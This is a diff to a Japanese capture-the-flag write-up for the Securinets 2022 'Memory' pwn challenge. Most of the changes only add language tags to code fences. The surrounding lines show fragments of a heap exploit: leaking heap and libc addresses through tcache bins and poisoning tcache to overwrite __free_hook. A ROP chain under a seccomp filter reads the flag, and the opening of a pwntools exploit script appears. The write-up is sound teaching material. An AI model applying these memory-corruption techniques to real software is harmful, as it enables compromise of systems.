@@ -14,7 +14,7 @@
 
 ### C code:
 以下はGhidraを用いて`main`関数をデコンパイルした結果です。
-```
+```c
 void main(void)
 
 {
@@ -61,7 +61,7 @@ void main(void)
 * dview()はptrが指すchunk（最後にmallocしたチャンク）のデータを表示する。
 
 また最初に`sandbox`関数で`seccomp`の設定をしている。
-```
+```c
 void sandbox(void)
 
 {
@@ -93,7 +93,7 @@ void sandbox(void)
 `seccomp-tools`の結果は下記になります。
 
 `sys_read`, `sys_write`, `sys_open`, `sys_mprotect`, `sys_exit_group`以外のシステムコールを禁止しています。
-```
+```bash
 $ seccomp-tools dump ./memory
  line  CODE  JT   JF      K
 =================================
@@ -160,7 +160,7 @@ pwndbg> x/80gx 0x555555558000
 
 
 ヒープアドレスのリークは`tcachebins`にリンクされているchunkのアドレスをリークできるので、0x10サイズのchunkを`dallocate()`して、"\n"のみデータとして書き込み、その後に`dview()`するとヒープアドレスの上位7バイトをリークできる。
-```
+```bash
 $ ./memory
 Memory can be easily accessed !
 1) read
@@ -246,9 +246,10 @@ tcachebins
 ```
 
 下記を実行することで、libcのアドレス(`0x00007ffff7f8bc40`)を取得できる
+```python
 Alloc(0xe0, "\n")
 Alloc(0xe0, "A"*15+"\n")
-
+```
 ```
 0x55555555aed0:	0x0000000000000000	0x0000000000000000
 0x55555555aee0:	0x0000000000000000	0x00000000000000f1
@@ -266,7 +267,7 @@ Alloc(0xe0, "A"*15+"\n")
 ```
 
 下記を実行することで、0x80サイズの`tcachebins`に(`free_hook-0x10`)のデータを書き込むことができる。
-```
+```python
 Free()
 Alloc(0xe0, b"A"*0x78+p64(0x81)+p64(free_hook-0x10))
 ```
@@ -328,7 +329,7 @@ ROPでは、`./flag.txt`ファイルを`sys_open`して、`sys_read`、`sys_writ
 ```
 
 Exploitコードは下記になります。
-```
+```python
 from pwn import *
 
 context(os='linux', arch='amd64')
@@ -454,7 +455,7 @@ s.interactive()
 ```
 
 実行結果は下記になります。
-```
+```bash
 mito@ubuntu:~/CTF/Securinets_CTF_Quals_2022/Pwn_Memory$ python3 solve.py r
 [*] '/home/mito/CTF/Securinets_CTF_Quals_2022/Pwn_Memory/memory'
     Arch:     amd64-64-little
